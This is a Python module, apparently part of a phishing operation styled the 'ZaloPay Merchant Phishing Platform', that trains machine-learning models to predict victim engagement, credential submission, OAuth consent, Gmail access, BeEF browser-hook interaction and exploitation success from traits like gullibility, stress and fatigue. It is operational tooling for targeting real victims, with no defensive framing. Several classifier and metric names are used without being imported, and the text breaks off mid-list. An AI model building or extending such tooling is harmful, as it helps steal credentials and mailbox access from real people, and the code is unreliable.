"""
Behavior Prediction Engine
Advanced behavior prediction and pattern analysis for the ZaloPay Merchant Phishing Platform
"""

import os
import json
import time
import uuid
import numpy as np
import pandas as pd
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Optional, Tuple, Union
import logging
from dataclasses import dataclass, asdict
from enum import Enum
import pickle
import joblib
from collections import defaultdict, deque
import warnings
warnings.filterwarnings('ignore')

# Machine Learning imports
from sklearn.ensemble import RandomForestRegressor, GradientBoostingRegressor, AdaBoostRegressor
from sklearn.linear_model import LinearRegression, Ridge, Lasso, ElasticNet
from sklearn.neural_network import MLPRegressor
from sklearn.svm import SVR
from sklearn.preprocessing import StandardScaler, LabelEncoder, MinMaxScaler
from sklearn.model_selection import train_test_split, cross_val_score, TimeSeriesSplit
from sklearn.metrics import mean_squared_error, mean_absolute_error, r2_score
import xgboost as xgb
from scipy import stats
from scipy.spatial.distance import pdist, squareform
import networkx as nx

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class BehaviorType(Enum):
    """Behavior type enumeration"""
    VICTIM_ENGAGEMENT = "victim_engagement"
    CAMPAIGN_RESPONSE = "campaign_response"
    CREDENTIAL_SUBMISSION = "credential_submission"
    OAUTH_COMPLETION = "oauth_completion"
    GMAIL_ACCESS = "gmail_access"
    BEEF_INTERACTION = "beef_interaction"
    EXPLOITATION_SUCCESS = "exploitation_success"
    SESSION_DURATION = "session_duration"
    CONVERSION_LIKELIHOOD = "conversion_likelihood"

class PredictionHorizon(Enum):
    """Prediction horizon enumeration"""
    IMMEDIATE = "immediate"  # Next 5 minutes
    SHORT_TERM = "short_term"  # Next hour
    MEDIUM_TERM = "medium_term"  # Next day
    LONG_TERM = "long_term"  # Next week

@dataclass
class BehaviorPrediction:
    """Behavior prediction result"""
    prediction_id: str
    behavior_type: BehaviorType
    prediction_horizon: PredictionHorizon
    predicted_value: float
    confidence: float
    probability_distribution: Dict[str, float]
    feature_importance: Dict[str, float]
    timestamp: datetime
    input_features: Dict[str, Any]
    metadata: Dict[str, Any]

@dataclass
class BehaviorPattern:
    """Behavior pattern structure"""
    pattern_id: str
    behavior_type: BehaviorType
    pattern_name: str
    description: str
    frequency: float
    confidence: float
    conditions: Dict[str, Any]
    outcomes: Dict[str, Any]
    created_at: datetime
    last_seen: datetime

class BehaviorPredictor:
    """Advanced behavior prediction engine"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.models = {}
        self.scalers = {}
        self.label_encoders = {}
        self.feature_importance = {}
        self.behavior_patterns = {}
        
        # Initialize prediction models
        self._initialize_models()
        
        # Historical data storage
        self.historical_data = defaultdict(deque)
        self.max_history_size = 10000
        
        # Prediction cache
        self.prediction_cache = {}
        self.cache_ttl = 300  # 5 minutes
    
    def _initialize_models(self):
        """Initialize behavior prediction models"""
        try:
            # Victim engagement prediction models
            self.models[BehaviorType.VICTIM_ENGAGEMENT] = {
                'immediate': xgb.XGBRegressor(n_estimators=100, random_state=42),
                'short_term': RandomForestRegressor(n_estimators=100, random_state=42),
                'medium_term': GradientBoostingRegressor(n_estimators=100, random_state=42),
                'long_term': MLPRegressor(hidden_layer_sizes=(100, 50), random_state=42)
            }
            
            # Campaign response prediction models
            self.models[BehaviorType.CAMPAIGN_RESPONSE] = {
                'immediate': xgb.XGBRegressor(n_estimators=100, random_state=42),
                'short_term': RandomForestRegressor(n_estimators=100, random_state=42),
                'medium_term': GradientBoostingRegressor(n_estimators=100, random_state=42),
                'long_term': MLPRegressor(hidden_layer_sizes=(100, 50), random_state=42)
            }
            
            # Credential submission prediction models
            self.models[BehaviorType.CREDENTIAL_SUBMISSION] = {
                'immediate': xgb.XGBClassifier(n_estimators=100, random_state=42),
                'short_term': RandomForestClassifier(n_estimators=100, random_state=42),
                'medium_term': GradientBoostingClassifier(n_estimators=100, random_state=42),
                'long_term': MLPClassifier(hidden_layer_sizes=(100, 50), random_state=42)
            }
            
            # OAuth completion prediction models
            self.models[BehaviorType.OAUTH_COMPLETION] = {
                'immediate': xgb.XGBClassifier(n_estimators=100, random_state=42),
                'short_term': RandomForestClassifier(n_estimators=100, random_state=42),
                'medium_term': GradientBoostingClassifier(n_estimators=100, random_state=42),
                'long_term': MLPClassifier(hidden_layer_sizes=(100, 50), random_state=42)
            }
            
            # Gmail access prediction models
            self.models[BehaviorType.GMAIL_ACCESS] = {
                'immediate': xgb.XGBClassifier(n_estimators=100, random_state=42),
                'short_term': RandomForestClassifier(n_estimators=100, random_state=42),
                'medium_term': GradientBoostingClassifier(n_estimators=100, random_state=42),
                'long_term': MLPClassifier(hidden_layer_sizes=(100, 50), random_state=42)
            }
            
            # BeEF interaction prediction models
            self.models[BehaviorType.BEEF_INTERACTION] = {
                'immediate': xgb.XGBRegressor(n_estimators=100, random_state=42),
                'short_term': RandomForestRegressor(n_estimators=100, random_state=42),
                'medium_term': GradientBoostingRegressor(n_estimators=100, random_state=42),
                'long_term': MLPRegressor(hidden_layer_sizes=(100, 50), random_state=42)
            }
            
            # Exploitation success prediction models
            self.models[BehaviorType.EXPLOITATION_SUCCESS] = {
                'immediate': xgb.XGBClassifier(n_estimators=100, random_state=42),
                'short_term': RandomForestClassifier(n_estimators=100, random_state=42),
                'medium_term': GradientBoostingClassifier(n_estimators=100, random_state=42),
                'long_term': MLPClassifier(hidden_layer_sizes=(100, 50), random_state=42)
            }
            
            # Session duration prediction models
            self.models[BehaviorType.SESSION_DURATION] = {
                'immediate': xgb.XGBRegressor(n_estimators=100, random_state=42),
                'short_term': RandomForestRegressor(n_estimators=100, random_state=42),
                'medium_term': GradientBoostingRegressor(n_estimators=100, random_state=42),
                'long_term': MLPRegressor(hidden_layer_sizes=(100, 50), random_state=42)
            }
            
            # Conversion likelihood prediction models
            self.models[BehaviorType.CONVERSION_LIKELIHOOD] = {
                'immediate': xgb.XGBClassifier(n_estimators=100, random_state=42),
                'short_term': RandomForestClassifier(n_estimators=100, random_state=42),
                'medium_term': GradientBoostingClassifier(n_estimators=100, random_state=42),
                'long_term': MLPClassifier(hidden_layer_sizes=(100, 50), random_state=42)
            }
            
            # Initialize scalers and encoders
            for behavior_type in BehaviorType:
                self.scalers[behavior_type] = StandardScaler()
                self.label_encoders[behavior_type] = LabelEncoder()
            
            logger.info("Behavior prediction models initialized successfully")
            
        except Exception as e:
            logger.error(f"Error initializing behavior prediction models: {e}")
            raise
    
    def create_behavior_features(self, data: Dict[str, Any], behavior_type: BehaviorType) -> np.ndarray:
        """Create features for behavior prediction"""
        try:
            features = []
            
            if behavior_type == BehaviorType.VICTIM_ENGAGEMENT:
                features = self._create_victim_engagement_features(data)
            elif behavior_type == BehaviorType.CAMPAIGN_RESPONSE:
                features = self._create_campaign_response_features(data)
            elif behavior_type == BehaviorType.CREDENTIAL_SUBMISSION:
                features = self._create_credential_submission_features(data)
            elif behavior_type == BehaviorType.OAUTH_COMPLETION:
                features = self._create_oauth_completion_features(data)
            elif behavior_type == BehaviorType.GMAIL_ACCESS:
                features = self._create_gmail_access_features(data)
            elif behavior_type == BehaviorType.BEEF_INTERACTION:
                features = self._create_beef_interaction_features(data)
            elif behavior_type == BehaviorType.EXPLOITATION_SUCCESS:
                features = self._create_exploitation_success_features(data)
            elif behavior_type == BehaviorType.SESSION_DURATION:
                features = self._create_session_duration_features(data)
            elif behavior_type == BehaviorType.CONVERSION_LIKELIHOOD:
                features = self._create_conversion_likelihood_features(data)
            else:
                features = self._create_generic_features(data)
            
            return features.reshape(1, -1)
            
        except Exception as e:
            logger.error(f"Error creating behavior features: {e}")
            return np.zeros((1, 20))  # Default feature vector
    
    def _create_victim_engagement_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for victim engagement prediction"""
        try:
            features = []
            
            # Victim demographics
            features.extend([
                data.get('age', 0),
                data.get('gender_encoded', 0),
                data.get('education_level', 0),
                data.get('income_level', 0),
                data.get('tech_savvy', 0)
            ])
            
            # Behavioral history
            features.extend([
                data.get('previous_engagements', 0),
                data.get('avg_session_duration', 0),
                data.get('avg_page_views', 0),
                data.get('click_rate', 0),
                data.get('form_completion_rate', 0)
            ])
            
            # Current session context
            features.extend([
                data.get('time_on_page', 0),
                data.get('scroll_depth', 0),
                data.get('mouse_movements', 0),
                data.get('keyboard_activity', 0),
                data.get('focus_events', 0)
            ])
            
            # Environmental factors
            features.extend([
                data.get('hour_of_day', 0),
                data.get('day_of_week', 0),
                data.get('is_weekend', 0),
                data.get('is_business_hours', 0),
                data.get('device_type_encoded', 0)
            ])
            
            # Campaign factors
            features.extend([
                data.get('campaign_credibility', 0),
                data.get('message_personalization', 0),
                data.get('urgency_level', 0),
                data.get('social_proof_level', 0),
                data.get('visual_appeal', 0)
            ])
            
            return np.array(features)
            
        except Exception as e:
            logger.error(f"Error creating victim engagement features: {e}")
            return np.zeros(25)
    
    def _create_campaign_response_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for campaign response prediction"""
        try:
            features = []
            
            # Campaign characteristics
            features.extend([
                data.get('campaign_type_encoded', 0),
                data.get('target_demographic_encoded', 0),
                data.get('geographic_scope', 0),
                data.get('budget', 0),
                data.get('duration_days', 0)
            ])
            
            # Content features
            features.extend([
                data.get('subject_line_length', 0),
                data.get('email_length', 0),
                data.get('has_images', 0),
                data.get('has_links', 0),
                data.get('personalization_level', 0)
            ])
            
            # Timing features
            features.extend([
                data.get('launch_hour', 0),
                data.get('launch_day_of_week', 0),
                data.get('launch_month', 0),
                data.get('is_holiday', 0),
                data.get('seasonal_factor', 0)
            ])
            
            # Historical performance
            features.extend([
                data.get('historical_open_rate', 0),
                data.get('historical_click_rate', 0),
                data.get('historical_conversion_rate', 0),
                data.get('similar_campaign_success', 0),
                data.get('competitor_activity', 0)
            ])
            
            # Target audience features
            features.extend([
                data.get('audience_size', 0),
                data.get('audience_engagement', 0),
                data.get('audience_demographics_score', 0),
                data.get('audience_behavioral_score', 0),
                data.get('audience_psychographic_score', 0)
            ])
            
            return np.array(features)
            
        except Exception as e:
            logger.error(f"Error creating campaign response features: {e}")
            return np.zeros(25)
    
    def _create_credential_submission_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for credential submission prediction"""
        try:
            features = []
            
            # Victim characteristics
            features.extend([
                data.get('victim_age', 0),
                data.get('victim_gender_encoded', 0),
                data.get('victim_education', 0),
                data.get('victim_income', 0),
                data.get('victim_tech_savvy', 0)
            ])
            
            # Psychological factors
            features.extend([
                data.get('trust_level', 0),
                data.get('suspicion_level', 0),
                data.get('gullibility_score', 0),
                data.get('impulsiveness_score', 0),
                data.get('curiosity_score', 0)
            ])
            
            # Form characteristics
            features.extend([
                data.get('form_length', 0),
                data.get('required_fields', 0),
                data.get('optional_fields', 0),
                data.get('form_complexity', 0),
                data.get('form_validation', 0)
            ])
            
            # Context factors
            features.extend([
                data.get('time_pressure', 0),
                data.get('distraction_level', 0),
                data.get('stress_level', 0),
                data.get('fatigue_level', 0),
                data.get('cognitive_load', 0)
            ])
            
            # Security indicators
            features.extend([
                data.get('security_warnings', 0),
                data.get('ssl_indicator', 0),
                data.get('trust_indicators', 0),
                data.get('suspicious_elements', 0),
                data.get('legitimacy_score', 0)
            ])
            
            return np.array(features)
            
        except Exception as e:
            logger.error(f"Error creating credential submission features: {e}")
            return np.zeros(25)
    
    def _create_oauth_completion_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for OAuth completion prediction"""
        try:
            features = []
            
            # OAuth provider features
            features.extend([
                data.get('provider_encoded', 0),
                data.get('provider_trust_score', 0),
                data.get('provider_familiarity', 0),
                data.get('provider_ui_quality', 0),
                data.get('provider_security_level', 0)
            ])
            
            # User experience factors
            features.extend([
                data.get('ui_complexity', 0),
                data.get('step_count', 0),
                data.get('error_count', 0),
                data.get('retry_count', 0),
                data.get('help_usage', 0)
            ])
            
            # Technical factors
            features.extend([
                data.get('browser_compatibility', 0),
                data.get('device_compatibility', 0),
                data.get('network_speed', 0),
                data.get('loading_time', 0),
                data.get('timeout_risk', 0)
            ])
            
            # Psychological factors
            features.extend([
                data.get('trust_in_provider', 0),
                data.get('privacy_concerns', 0),
                data.get('convenience_value', 0),
                data.get('security_concerns', 0),
                data.get('social_proof', 0)
            ])
            
            # Context factors
            features.extend([
                data.get('time_available', 0),
                data.get('urgency_level', 0),
                data.get('alternative_options', 0),
                data.get('previous_experience', 0),
                data.get('recommendation_source', 0)
            ])
            
            return np.array(features)
            
        except Exception as e:
            logger.error(f"Error creating OAuth completion features: {e}")
            return np.zeros(25)
    
    def _create_gmail_access_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for Gmail access prediction"""
        try:
            features = []
            
            # OAuth success factors
            features.extend([
                data.get('oauth_success', 0),
                data.get('token_validity', 0),
                data.get('scope_approval', 0),
                data.get('permission_granted', 0),
                data.get('consent_given', 0)
            ])
            
            # Gmail-specific factors
            features.extend([
                data.get('gmail_usage_frequency', 0),
                data.get('gmail_importance', 0),
                data.get('email_volume', 0),
                data.get('business_use', 0),
                data.get('personal_use', 0)
            ])
            
            # Security factors
            features.extend([
                data.get('security_awareness', 0),
                data.get('privacy_concerns', 0),
                data.get('data_sensitivity', 0),
                data.get('compliance_requirements', 0),
                data.get('risk_tolerance', 0)
            ])
            
            # Technical factors
            features.extend([
                data.get('browser_security', 0),
                data.get('device_security', 0),
                data.get('network_security', 0),
                data.get('antivirus_present', 0),
                data.get('firewall_active', 0)
            ])
            
            # Behavioral factors
            features.extend([
                data.get('trust_level', 0),
                data.get('suspicion_level', 0),
                data.get('curiosity_level', 0),
                data.get('impulsiveness', 0),
                data.get('risk_taking', 0)
            ])
            
            return np.array(features)
            
        except Exception as e:
            logger.error(f"Error creating Gmail access features: {e}")
            return np.zeros(25)
    
    def _create_beef_interaction_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for BeEF interaction prediction"""
        try:
            features = []
            
            # Browser capabilities
            features.extend([
                data.get('browser_version', 0),
                data.get('javascript_enabled', 0),
                data.get('cookies_enabled', 0),
                data.get('local_storage_available', 0),
                data.get('webgl_support', 0)
            ])
            
            # Security settings
            features.extend([
                data.get('popup_blocker', 0),
                data.get('ad_blocker', 0),
                data.get('script_blocker', 0),
                data.get('tracking_protection', 0),
                data.get('privacy_mode', 0)
            ])
            
            # User behavior
            features.extend([
                data.get('mouse_movements', 0),
                data.get('keyboard_activity', 0),
                data.get('scroll_behavior', 0),
                data.get('click_patterns', 0),
                data.get('focus_changes', 0)
            ])
            
            # Technical environment
            features.extend([
                data.get('os_version', 0),
                data.get('device_type', 0),
                data.get('screen_resolution', 0),
                data.get('network_type', 0),
                data.get('connection_speed', 0)
            ])
            
            # Psychological factors
            features.extend([
                data.get('attention_level', 0),
                data.get('distraction_level', 0),
                data.get('curiosity_level', 0),
                data.get('trust_level', 0),
                data.get('suspicion_level', 0)
            ])
            
            return np.array(features)
            
        except Exception as e:
            logger.error(f"Error creating BeEF interaction features: {e}")
            return np.zeros(25)
    
    def _create_exploitation_success_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for exploitation success prediction"""
        try:
            features = []
            
            # Victim vulnerability
            features.extend([
                data.get('vulnerability_score', 0),
                data.get('security_awareness', 0),
                data.get('tech_savvy', 0),
                data.get('risk_tolerance', 0),
                data.get('gullibility_score', 0)
            ])
            
            # Technical factors
            features.extend([
                data.get('browser_vulnerabilities', 0),
                data.get('os_vulnerabilities', 0),
                data.get('plugin_vulnerabilities', 0),
                data.get('network_vulnerabilities', 0),
                data.get('device_vulnerabilities', 0)
            ])
            
            # Attack sophistication
            features.extend([
                data.get('attack_complexity', 0),
                data.get('social_engineering_level', 0),
                data.get('technical_exploit_level', 0),
                data.get('persistence_level', 0),
                data.get('stealth_level', 0)
            ])
            
            # Environmental factors
            features.extend([
                data.get('time_pressure', 0),
                data.get('distraction_level', 0),
                data.get('stress_level', 0),
                data.get('fatigue_level', 0),
                data.get('cognitive_load', 0)
            ])
            
            # Success indicators
            features.extend([
                data.get('previous_success_rate', 0),
                data.get('similar_attack_success', 0),
                data.get('target_value', 0),
                data.get('attack_motivation', 0),
                data.get('resource_availability', 0)
            ])
            
            return np.array(features)
            
        except Exception as e:
            logger.error(f"Error creating exploitation success features: {e}")
            return np.zeros(25)
    
    def _create_session_duration_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for session duration prediction"""
        try:
            features = []
            
            # User characteristics
            features.extend([
                data.get('user_age', 0),
                data.get('user_experience', 0),
                data.get('user_engagement', 0),
                data.get('user_patience', 0),
                data.get('user_curiosity', 0)
            ])
            
            # Content factors
            features.extend([
                data.get('content_quality', 0),
                data.get('content_relevance', 0),
                data.get('content_length', 0),
                data.get('content_interactivity', 0),
                data.get('content_novelty', 0)
            ])
            
            # Interface factors
            features.extend([
                data.get('ui_quality', 0),
                data.get('ui_complexity', 0),
                data.get('ui_responsiveness', 0),
                data.get('ui_accessibility', 0),
                data.get('ui_aesthetics', 0)
            ])
            
            # Environmental factors
            features.extend([
                data.get('time_available', 0),
                data.get('distraction_level', 0),
                data.get('interruption_risk', 0),
                data.get('urgency_level', 0),
                data.get('motivation_level', 0)
            ])
            
            # Technical factors
            features.extend([
                data.get('loading_speed', 0),
                data.get('error_rate', 0),
                data.get('compatibility_issues', 0),
                data.get('network_stability', 0),
                data.get('device_performance', 0)
            ])
            
            return np.array(features)
            
        except Exception as e:
            logger.error(f"Error creating session duration features: {e}")
            return np.zeros(25)
    
    def _create_conversion_likelihood_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create features for conversion likelihood prediction"""
        try:
            features = []
            
            # User intent
            features.extend([
                data.get('intent_strength', 0),
                data.get('need_level', 0),
                data.get('urgency_level', 0),
                data.get('motivation_level', 0),
                data.get('commitment_level', 0)
            ])
            
            # Value proposition
            features.extend([
                data.get('value_perception', 0),
                data.get('benefit_clarity', 0),
                data.get('cost_perception', 0),
                data.get('risk_perception', 0),
                data.get('trust_level', 0)
            ])
            
            # Social factors
            features.extend([
                data.get('social_proof', 0),
                data.get('peer_influence', 0),
                data.get('authority_endorsement', 0),
                data.get('testimonial_quality', 0),
                data.get('recommendation_strength', 0)
            ])
            
            # Friction factors
            features.extend([
                data.get('process_complexity', 0),
                data.get('time_required', 0),
                data.get('effort_required', 0),
                data.get('information_required', 0),
                data.get('decision_complexity', 0)
            ])
            
            # Context factors
            features.extend([
                data.get('timing_appropriateness', 0),
                data.get('environment_suitability', 0),
                data.get('mood_state', 0),
                data.get('stress_level', 0),
                data.get('cognitive_load', 0)
            ])
            
            return np.array(features)
            
        except Exception as e:
            logger.error(f"Error creating conversion likelihood features: {e}")
            return np.zeros(25)
    
    def _create_generic_features(self, data: Dict[str, Any]) -> np.ndarray:
        """Create generic features for any behavior type"""
        try:
            features = []
            
            # Basic demographics
            features.extend([
                data.get('age', 0),
                data.get('gender_encoded', 0),
                data.get('education_level', 0),
                data.get('income_level', 0)
            ])
            
            # Behavioral patterns
            features.extend([
                data.get('engagement_level', 0),
                data.get('activity_frequency', 0),
                data.get('session_duration', 0),
                data.get('interaction_count', 0)
            ])
            
            # Temporal factors
            features.extend([
                data.get('hour_of_day', 0),
                data.get('day_of_week', 0),
                data.get('month', 0),
                data.get('is_weekend', 0)
            ])
            
            # Technical factors
            features.extend([
                data.get('device_type_encoded', 0),
                data.get('browser_encoded', 0),
                data.get('os_encoded', 0),
                data.get('network_type', 0)
            ])
            
            # Context factors
            features.extend([
                data.get('location_encoded', 0),
                data.get('language_encoded', 0),
                data.get('timezone_offset', 0),
                data.get('is_mobile', 0)
            ])
            
            return np.array(features)
            
        except Exception as e:
            logger.error(f"Error creating generic features: {e}")
            return np.zeros(20)
    
    def train_behavior_model(self, behavior_type: BehaviorType, training_data: List[Dict[str, Any]], 
                           target_column: str, prediction_horizon: PredictionHorizon) -> Dict[str, Any]:
        """Train a behavior prediction model"""
        try:
            # Prepare training data
            X = []
            y = []
            
            for data_point in training_data:
                features = self.create_behavior_features(data_point, behavior_type)
                X.append(features.flatten())
                
                if target_column in data_point:
                    y.append(data_point[target_column])
            
            X = np.array(X)
            y = np.array(y)
            
            # Split data
            X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
            
            # Scale features
            X_train_scaled = self.scalers[behavior_type].fit_transform(X_train)
            X_test_scaled = self.scalers[behavior_type].transform(X_test)
            
            # Train model
            model = self.models[behavior_type][prediction_horizon.value]
            model.fit(X_train_scaled, y_train)
            
            # Evaluate model
            y_pred = model.predict(X_test_scaled)
            
            # Calculate metrics
            if behavior_type in [BehaviorType.CREDENTIAL_SUBMISSION, BehaviorType.OAUTH_COMPLETION, 
                               BehaviorType.GMAIL_ACCESS, BehaviorType.EXPLOITATION_SUCCESS, 
                               BehaviorType.CONVERSION_LIKELIHOOD]:
                # Classification metrics
                accuracy = accuracy_score(y_test, y_pred)
                precision = precision_score(y_test, y_pred, average='weighted', zero_division=0)
                recall = recall_score(y_test, y_pred, average='weighted', zero_division=0)
                f1 = f1_score(y_test, y_pred, average='weighted', zero_division=0)
            else:
                # Regression metrics
                mse = mean_squared_error(y_test, y_pred)
                mae = mean_absolute_error(y_test, y_pred)
                r2 = r2_score(y_test, y_pred)
                accuracy = r2
                precision = 0
                recall = 0
                f1 = 0
            
            # Get feature importance
            if hasattr(model, 'feature_importances_'):
                feature_importance = dict(zip(self._get_feature_names(behavior_type), model.feature_importances_))
            else:
                feature_importance = {}
            
            # Store model
            model_id = f"behavior_{behavior_type.value}_{prediction_horizon.value}_{int(time.time())}"
            self._store_behavior_model(behavior_type, prediction_horizon, model, model_id)
            
            results = {
                'model_id': model_id,
                'behavior_type': behavior_type.value,
                'prediction_horizon': prediction_horizon.value,
                'accuracy': accuracy,
                'precision': precision,
                'recall': recall,
                'f1_score': f1,
                'feature_importance': feature_importance,
                'training_samples': len(X_train),
                'test_samples': len(X_test)
            }
            
            logger.info(f"Behavior model trained successfully: {model_id}")
            return results
            
        except Exception as e:
            logger.error(f"Error training behavior model: {e}")
            raise
    
    def predict_behavior(self, behavior_type: BehaviorType, input_data: Dict[str, Any], 
                        prediction_horizon: PredictionHorizon) -> BehaviorPrediction:
        """Predict behavior using trained model"""
        try:
            # Check cache first
            cache_key = f"{behavior_type.value}_{prediction_horizon.value}_{hash(str(input_data))}"
            if cache_key in self.prediction_cache:
                cached_prediction = self.prediction_cache[cache_key]
                if time.time() - cached_prediction['timestamp'] < self.cache_ttl:
                    return cached_prediction['prediction']
            
            # Get model
            model = self.models[behavior_type][prediction_horizon.value]
            
            # Prepare features
            features = self.create_behavior_features(input_data, behavior_type)
            features_scaled = self.scalers[behavior_type].transform(features)
            
            # Make prediction
            prediction = model.predict(features_scaled)[0]
            
            # Get prediction confidence
            if hasattr(model, 'predict_proba'):
                probabilities = model.predict_proba(features_scaled)[0]
                confidence = max(probabilities)
                probability_dict = {f"class_{i}": prob for i, prob in enumerate(probabilities)}
            else:
                confidence = 1.0
                probability_dict = {"prediction": float(prediction)}
            
            # Get feature importance
            if hasattr(model, 'feature_importances_'):
                feature_importance = dict(zip(self._get_feature_names(behavior_type), model.feature_importances_))
            else:
                feature_importance = {}
            
            # Create prediction result
            prediction_id = f"pred_{int(time.time())}_{uuid.uuid4().hex[:8]}"
            
            result = BehaviorPrediction(
                prediction_id=prediction_id,
                behavior_type=behavior_type,
                prediction_horizon=prediction_horizon,
                predicted_value=float(prediction),
                confidence=confidence,
                probability_distribution=probability_dict,
                feature_importance=feature_importance,
                timestamp=datetime.now(timezone.utc),
                input_features=input_data,
                metadata={"model_type": "behavior_prediction"}
            )
            
            # Cache prediction
            self.prediction_cache[cache_key] = {
                'prediction': result,
                'timestamp': time.time()
            }
            
            # Store prediction
            self._store_behavior_prediction(result)
            
            return result
            
        except Exception as e:
            logger.error(f"Error predicting behavior: {e}")
            raise
    
    def analyze_behavior_patterns(self, behavior_type: BehaviorType, 
                                data: List[Dict[str, Any]]) -> List[BehaviorPattern]:
        """Analyze behavior patterns in data"""
        try:
            patterns = []
            
            # Prepare data
            X = []
            for data_point in data:
                features = self.create_behavior_features(data_point, behavior_type)
                X.append(features.flatten())
            
            X = np.array(X)
            X_scaled = self.scalers[behavior_type].fit_transform(X)
            
            # Perform clustering to find patterns
            from sklearn.cluster import KMeans, DBSCAN
            
            # Try different clustering methods
            clustering_methods = [
                ('kmeans', KMeans(n_clusters=5, random_state=42)),
                ('dbscan', DBSCAN(eps=0.5, min_samples=3))
            ]
            
            for method_name, clustering_model in clustering_methods:
                try:
                    cluster_labels = clustering_model.fit_predict(X_scaled)
                    unique_clusters = np.unique(cluster_labels)
                    
                    for cluster_id in unique_clusters:
                        if cluster_id == -1:  # Noise points
                            continue
                        
                        cluster_mask = cluster_labels == cluster_id
                        cluster_data = X_scaled[cluster_mask]
                        cluster_original_data = [data[i] for i in range(len(data)) if cluster_mask[i]]
                        
                        # Analyze cluster characteristics
                        pattern = self._analyze_cluster_pattern(
                            cluster_id, cluster_data, cluster_original_data, 
                            behavior_type, method_name
                        )
                        
                        if pattern:
                            patterns.append(pattern)
                            
                except Exception as e:
                    logger.error(f"Error with {method_name} clustering: {e}")
                    continue
            
            # Store patterns
            for pattern in patterns:
                self._store_behavior_pattern(pattern)
            
            logger.info(f"Analyzed {len(patterns)} behavior patterns for {behavior_type.value}")
            return patterns
            
        except Exception as e:
            logger.error(f"Error analyzing behavior patterns: {e}")
            return []
    
    def _analyze_cluster_pattern(self, cluster_id: int, cluster_data: np.ndarray, 
                               cluster_original_data: List[Dict[str, Any]], 
                               behavior_type: BehaviorType, method_name: str) -> Optional[BehaviorPattern]:
        """Analyze a cluster to extract behavior pattern"""
        try:
            if len(cluster_data) < 3:  # Need minimum samples for pattern
                return None
            
            # Calculate cluster statistics
            cluster_center = cluster_data.mean(axis=0)
            cluster_std = cluster_data.std(axis=0)
            
            # Analyze common characteristics
            common_conditions = {}
            common_outcomes = {}
            
            # Analyze numerical features
            for i, feature_name in enumerate(self._get_feature_names(behavior_type)):
                if i < len(cluster_center):
                    mean_val = cluster_center[i]
                    std_val = cluster_std[i]
                    
                    if std_val < 0.1:  # Low variance - common characteristic
                        common_conditions[feature_name] = {
                            'value': float(mean_val),
                            'variance': float(std_val)
                        }
            
            # Analyze categorical features from original data
            categorical_features = ['gender', 'device_type', 'browser', 'os', 'location']
            for feature in categorical_features:
                values = [d.get(feature) for d in cluster_original_data if feature in d]
                if values:
                    most_common = max(set(values), key=values.count)
                    frequency = values.count(most_common) / len(values)
                    
                    if frequency > 0.7:  # High frequency - common characteristic
                        common_conditions[feature] = {
                            'value': most_common,
                            'frequency': frequency
                        }
            
            # Create pattern
            pattern_id = f"pattern_{behavior_type.value}_{cluster_id}_{int(time.time())}"
            
            pattern = BehaviorPattern(
                pattern_id=pattern_id,
                behavior_type=behavior_type,
                pattern_name=f"{behavior_type.value}_pattern_{cluster_id}",
                description=f"Behavior pattern identified in {behavior_type.value} data using {method_name}",
                frequency=len(cluster_data) / len(cluster_original_data),
                confidence=1.0 - np.mean(cluster_std),  # Higher confidence for lower variance
                conditions=common_conditions,
                outcomes=common_outcomes,
                created_at=datetime.now(timezone.utc),
                last_seen=datetime.now(timezone.utc)
            )
            
            return pattern
            
        except Exception as e:
            logger.error(f"Error analyzing cluster pattern: {e}")
            return None
    
    def _get_feature_names(self, behavior_type: BehaviorType) -> List[str]:
        """Get feature names for behavior type"""
        feature_names = {
            BehaviorType.VICTIM_ENGAGEMENT: [
                'age', 'gender', 'education_level', 'income_level', 'tech_savvy',
                'previous_engagements', 'avg_session_duration', 'avg_page_views', 'click_rate', 'form_completion_rate',
                'time_on_page', 'scroll_depth', 'mouse_movements', 'keyboard_activity', 'focus_events',
                'hour_of_day', 'day_of_week', 'is_weekend', 'is_business_hours', 'device_type',
                'campaign_credibility', 'message_personalization', 'urgency_level', 'social_proof_level', 'visual_appeal'
            ],
            BehaviorType.CAMPAIGN_RESPONSE: [
                'campaign_type', 'target_demographic', 'geographic_scope', 'budget', 'duration_days',
                'subject_line_length', 'email_length', 'has_images', 'has_links', 'personalization_level',
                'launch_hour', 'launch_day_of_week', 'launch_month', 'is_holiday', 'seasonal_factor',
                'historical_open_rate', 'historical_click_rate', 'historical_conversion_rate', 'similar_campaign_success', 'competitor_activity',
                'audience_size', 'audience_engagement', 'audience_demographics_score', 'audience_behavioral_score', 'audience_psychographic_score'
            ],
            BehaviorType.CREDENTIAL_SUBMISSION: [
                'victim_age', 'victim_gender', 'victim_education', 'victim_income', 'victim_tech_savvy',
                'trust_level', 'suspicion_level', 'gullibility_score', 'impulsiveness_score', 'curiosity_score',
                'form_length', 'required_fields', 'optional_fields', 'form_complexity', 'form_validation',
                'time_pressure', 'distraction_level', 'stress_level', 'fatigue_level', 'cognitive_load',
                'security_warnings', 'ssl_indicator', 'trust_indicators', 'suspicious_elements', 'legitimacy_score'
            ],
            BehaviorType.OAUTH_COMPLETION: [
                'provider', 'provider_trust_score', 'provider_familiarity', 'provider_ui_quality', 'provider_security_level',
                'ui_complexity', 'step_count', 'error_count', 'retry_count', 'help_usage',
                'browser_compatibility', 'device_compatibility', 'network_speed', 'loading_time', 'timeout_risk',
                'trust_in_provider', 'privacy_concerns', 'convenience_value', 'security_concerns', 'social_proof',
                'time_available', 'urgency_level', 'alternative_options', 'previous_experience', 'recommendation_source'
            ],
            BehaviorType.GMAIL_ACCESS: [
                'oauth_success', 'token_validity', 'scope_approval', 'permission_granted', 'consent_given',
                'gmail_usage_frequency', 'gmail_importance', 'email_volume', 'business_use', 'personal_use',
                'security_awareness', 'privacy_concerns', 'data_sensitivity', 'compliance_requirements', 'risk_tolerance',
                'browser_security', 'device_security', 'network_security', 'antivirus_present', 'firewall_active',
